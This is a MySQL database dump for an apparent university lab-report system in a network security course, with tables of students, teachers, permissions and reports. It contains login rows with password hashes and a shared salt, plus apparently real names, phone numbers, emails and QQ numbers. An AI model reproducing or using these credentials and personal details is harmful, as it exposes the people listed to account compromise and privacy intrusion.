INSERT INTO `report` VALUES ('4', '8', '4', '55', '2018-12-12 18:23:51', '成绩不合格', '实验一 加密认证通信系统实现 \r\n设计实现一个通信系统，双方可以通过消息和文件通信，用户可选择一种加密算法和认证算法，对消息和文件进行加密通信和完整性验证。（要实现认证和加密，工具和语言不限，可以直接调用现有模块，认证和加密不限） \r\n实验二  综合扫描及安全评估 \r\n利用常见的一些扫描工具可以检测本系统及其它系统是否存在漏洞等安全隐患，给出全面而完善的评估报告，帮助管理员发现存在的问题，进而采取有力措施予以弥补，从而提高系统的安全性能。 \r\n实验三  网络攻防技术 \r\n矛与盾的关系告诉我们，在研究网络安全技术时，只着眼于安全防范技术是远远不够的，知己知彼方能百战不殆，因此，很有必要同时研究攻击与防范技术，才能更有效地解决各种威胁。 \r\n实验四  Windows系统安全配置方案 \r\n作为网络节点，操作系统安全成为网络信息安全首先应予考虑的事务，然而人们往往忽视了OS的安全性。其实，OS的安全不只体现在密码口令上，这仅仅是最基本的一个方面。除此之外，服务、端口、共享资源以及各种应用都很有可能存在着安全隐患，因此，应采取相应措施设置完善的本地安全策略，并使用防病毒软件、防火墙软件甚至入侵检测软件来加强系统的安全。 \r\n其中实验一要求编程实现，可直接调用相关功能函数完成。实验二至实验四可在机房的网络信息安全综合实验系统上完成。', 'kali之Metasploit密码破解', '1', '2', '苏培坷');

-- ----------------------------
-- Table structure for student
-- ----------------------------
DROP TABLE IF EXISTS `student`;
CREATE TABLE `student` (
  `id` bigint(20) NOT NULL AUTO_INCREMENT,
  `number` bigint(20) NOT NULL,
  `college` varchar(50) NOT NULL,
  `classname` varchar(20) NOT NULL,
  `tdescribe` varchar(255) DEFAULT NULL,
  `location` varchar(255) DEFAULT NULL,
  `jointime` datetime NOT NULL,
  `realname` varchar(10) NOT NULL,
  `img` varchar(255) DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=8 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of student
-- ----------------------------
INSERT INTO `student` VALUES ('1', '45', '浙江师范大学行知学院工学分院', '计算机161', '总之岁月漫长，然而值得等待。', '温州', '2018-10-29 15:43:18', '陈良炫', 'https://s1.ax1x.com/2018/12/01/FnYZz6.jpg');
INSERT INTO `student` VALUES ('4', '46', '浙江师范大学行知学院工学分院', '计算机161', '我想正是伸手摘星的精神，让我们很多人长时间地工作奋战。不论到哪，让作品充分表现这个精神，并且驱使我们放弃佳作，只求杰作。 —— 李奥贝纳', '泉州', '2018-10-29 15:43:18', '苏培坷', 'https://s1.ax1x.com/2018/12/01/FnYZz6.jpg');
INSERT INTO `student` VALUES ('5', '47', '浙江师范大学行知学院工学分院', '计算机161', '总之岁月漫长，然而值得等待。', '湖州', '2018-10-29 15:43:18', '陆杰森', 'https://s1.ax1x.com/2018/12/01/FnYZz6.jpg');
INSERT INTO `student` VALUES ('6', '21', '浙江师范大学行知学院工学分院', '计算机161', '总之岁月漫长，然而值得等待。', '杭州', '2018-10-29 15:43:18', '徐海滨', 'https://s1.ax1x.com/2018/12/01/FnYZz6.jpg');
INSERT INTO `student` VALUES ('7', '33', '浙江师范大学行知学院工学分院', '计算机161', '总之岁月漫长，然而值得等待。', '义乌', '2018-10-29 15:43:18', '楼汉东', 'https://s1.ax1x.com/2018/12/01/FnYZz6.jpg');

-- ----------------------------
-- Table structure for stu_cou
-- ----------------------------
DROP TABLE IF EXISTS `stu_cou`;
CREATE TABLE `stu_cou` (
  `stu_id` bigint(20) NOT NULL,
  `cou_id` bigint(20) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of stu_cou
-- ----------------------------
INSERT INTO `stu_cou` VALUES ('1', '1');
INSERT INTO `stu_cou` VALUES ('1', '3');
INSERT INTO `stu_cou` VALUES ('4', '1');
INSERT INTO `stu_cou` VALUES ('4', '4');
INSERT INTO `stu_cou` VALUES ('4', '3');

-- ----------------------------
-- Table structure for sys_logininfo
-- ----------------------------
DROP TABLE IF EXISTS `sys_logininfo`;
CREATE TABLE `sys_logininfo` (
  `id` bigint(20) NOT NULL AUTO_INCREMENT,
  `usertype` int(1) NOT NULL,
  `usercode` bigint(20) NOT NULL,
  `password` varchar(32) NOT NULL,
  `salt` varchar(8) DEFAULT NULL,
  `locked` int(1) NOT NULL,
  `userid` bigint(20) NOT NULL,
  `username` varchar(20) NOT NULL,
  `img` varchar(255) DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=6 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of sys_logininfo
-- ----------------------------
INSERT INTO `sys_logininfo` VALUES ('1', '0', '201635560215', '16b8be5f856cdd1e6a13674414e07fc6', 'hDM1Or', '0', '1', 'wzchenxuan', 'https://imgchr.com/i/FJZpkj');
INSERT INTO `sys_logininfo` VALUES ('2', '0', '123', '786a40b59baea8c465cc0061a961d9f4', 'hDM1Or', '0', '4', 'stutest', 'https://imgchr.com/i/FJZpkj');
INSERT INTO `sys_logininfo` VALUES ('3', '1', '123456', '786a40b59baea8c465cc0061a961d9f4', 'hDM1Or', '0', '2', 'tchtest', 'https://imgchr.com/i/FJZpkj');
INSERT INTO `sys_logininfo` VALUES ('4', '0', '201635560213', '2775bfac1002600a1add916db95c4918', 'hDM1Or', '0', '4', '陈同学', 'https://imgchr.com/i/FJZpkj');
INSERT INTO `sys_logininfo` VALUES ('5', '1', '17855864566', '2775bfac1002600a1add916db95c4918', 'hDM1Or', '0', '2', '叶老师', 'https://imgchr.com/i/FJZpkj');

-- ----------------------------
-- Table structure for sys_permision
-- ----------------------------
DROP TABLE IF EXISTS `sys_permision`;
CREATE TABLE `sys_permision` (
  `id` bigint(20) NOT NULL AUTO_INCREMENT,
  `pname` varchar(255) NOT NULL,
  `type` varchar(255) DEFAULT NULL,
  `url` varchar(255) DEFAULT NULL,
  `precode` varchar(255) DEFAULT NULL,
  `parentid` bigint(20) DEFAULT NULL,
  `parentids` varchar(255) DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=22 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of sys_permision
-- ----------------------------
INSERT INTO `sys_permision` VALUES ('1', '权限', 'permission', null, '', '0', '0/');
INSERT INTO `sys_permision` VALUES ('2', '课程管理', 'menu', null, null, '1', '0/1/');
INSERT INTO `sys_permision` VALUES ('3', '课程新增', 'permission', null, 'course:create', '11', '0/1/11/');
INSERT INTO `sys_permision` VALUES ('4', '课程删除', 'permission', null, 'course:delete', '11', '0/1/11/');
INSERT INTO `sys_permision` VALUES ('5', '课程更新', 'permission', null, 'course:update', '11', '0/1/11/');
INSERT INTO `sys_permision` VALUES ('6', '查看课程', 'permission', null, 'course:query', '11', '0/1/11/');
INSERT INTO `sys_permision` VALUES ('7', '模板管理', 'menu', null, null, '2', '0/2/');
INSERT INTO `sys_permision` VALUES ('8', '模板新增', 'permission', null, 'templete:create', '21', '0/2/21/');
INSERT INTO `sys_permision` VALUES ('9', '模板删除', 'permission', null, 'templete:delete', '21', '0/2/21/');
INSERT INTO `sys_permision` VALUES ('10', '模板更新', 'permission', null, 'templete:update', '21', '0/2/21/');
INSERT INTO `sys_permision` VALUES ('11', '查看模板', 'permission', null, 'templete:query', '21', '0/2/21/');
INSERT INTO `sys_permision` VALUES ('12', '报告管理', 'menu', null, '', '3', '0/3/');
INSERT INTO `sys_permision` VALUES ('13', '报告新增', 'permission', null, 'report:create', '31', '0/3/31/');
INSERT INTO `sys_permision` VALUES ('14', '报告删除', 'permission', null, 'report:delete', '31', '0/3/31/');
INSERT INTO `sys_permision` VALUES ('15', '报告更新', 'permission', null, 'report:update', '31', '0/3/31/');
INSERT INTO `sys_permision` VALUES ('17', '报告查看', 'permission', null, 'report:query', '31', '0/3/31/');
INSERT INTO `sys_permision` VALUES ('18', '实验操作', 'menu', null, '', '4', '0/4/');
INSERT INTO `sys_permision` VALUES ('19', '开始实验', 'permission', null, 'experiment:screate', '41', '0/4/41/');
INSERT INTO `sys_permision` VALUES ('20', '暂停实验', 'permission', null, 'experiment:stop', '41', '0/4/41/');
INSERT INTO `sys_permision` VALUES ('21', '结束实验', 'experiment:start', null, 'experiment:delete', '41', '0/4/41');

-- ----------------------------
-- Table structure for sys_user_permission
-- ----------------------------
DROP TABLE IF EXISTS `sys_user_permission`;
CREATE TABLE `sys_user_permission` (
  `usertype` int(1) DEFAULT NULL,
  `permission` bigint(20) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of sys_user_permission
-- ----------------------------
INSERT INTO `sys_user_permission` VALUES ('1', '3');
INSERT INTO `sys_user_permission` VALUES ('1', '4');
INSERT INTO `sys_user_permission` VALUES ('1', '5');
INSERT INTO `sys_user_permission` VALUES ('1', '15');
INSERT INTO `sys_user_permission` VALUES ('0', '13');
INSERT INTO `sys_user_permission` VALUES ('0', '14');
INSERT INTO `sys_user_permission` VALUES ('0', '15');
INSERT INTO `sys_user_permission` VALUES ('0', '17');
INSERT INTO `sys_user_permission` VALUES ('1', '17');

-- ----------------------------
-- Table structure for teacher
-- ----------------------------
DROP TABLE IF EXISTS `teacher`;
CREATE TABLE `teacher` (
  `id` bigint(20) NOT NULL AUTO_INCREMENT,
  `tname` varchar(255) NOT NULL,
  `phone` bigint(11) DEFAULT NULL,
  `email` varchar(50) DEFAULT NULL,
  `img` varchar(255) DEFAULT NULL,
  `jointime` date DEFAULT NULL,
  `qq` bigint(20) DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=4 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of teacher
-- ----------------------------
INSERT INTO `teacher` VALUES ('1', '邓大勇', '17855864560', '7855864560@qq.com', 'https://imgchr.com/i/FJVvnS', '2018-11-02', '17855864560');
INSERT INTO `teacher` VALUES ('2', '叶安心', '17855864560', '7855864560@qq.com', 'https://imgchr.com/i/FJVvnS', '2018-11-15', '17855864560');
INSERT INTO `teacher` VALUES ('3', '叶建栲', '17855864560', '7855864560@qq.com', 'https://imgchr.com/i/FJVvnS', '2018-11-15', '17855864560');

-- ----------------------------
-- Table structure for tmp_img
-- ----------------------------
DROP TABLE IF EXISTS `tmp_img`;
CREATE TABLE `tmp_img` (
  `tmp_id` bigint(20) NOT NULL,
  `img_id` bigint(20) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of tmp_img
-- ----------------------------
INSERT INTO `tmp_img` VALUES ('1', '21');
INSERT INTO `tmp_img` VALUES ('7', '25');
INSERT INTO `tmp_img` VALUES ('10', '37');
INSERT INTO `tmp_img` VALUES ('11', '27');
INSERT INTO `tmp_img` VALUES ('12', '28');
INSERT INTO `tmp_img` VALUES ('13', '29');
INSERT INTO `tmp_img` VALUES ('14', '30');
INSERT INTO `tmp_img` VALUES ('15', '31');
INSERT INTO `tmp_img` VALUES ('16', '32');
INSERT INTO `tmp_img` VALUES ('17', '33');
INSERT INTO `tmp_img` VALUES ('18', '35');
